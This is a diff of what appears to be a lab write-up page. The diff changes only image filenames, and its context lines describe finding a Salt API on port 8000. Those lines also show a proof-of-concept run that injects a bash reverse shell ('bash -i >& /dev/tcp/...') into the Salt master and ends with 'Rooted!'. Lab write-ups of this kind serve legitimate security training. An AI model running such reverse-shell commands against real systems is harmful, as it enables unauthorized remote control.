@@ -50,7 +50,7 @@ PORT     STATE SERVICE VERSION
 
 Port 8000 looked the most interesting since it was only returning JSON data. Visiting it just shows a few 'clients':
 
-<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (14) (4).png" alt=""><figcaption></figcaption></figure>
 
 When we view the headers, we can see that this is using a program called Salt API:
 
@@ -86,6 +86,6 @@ $ python3 poc.py --master 192.168.219.62 --exec 'bash -i >& /dev/tcp/192.168.45.
 [+] Successfully scheduled job: 20230705031527947368
 ```
 
-<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!
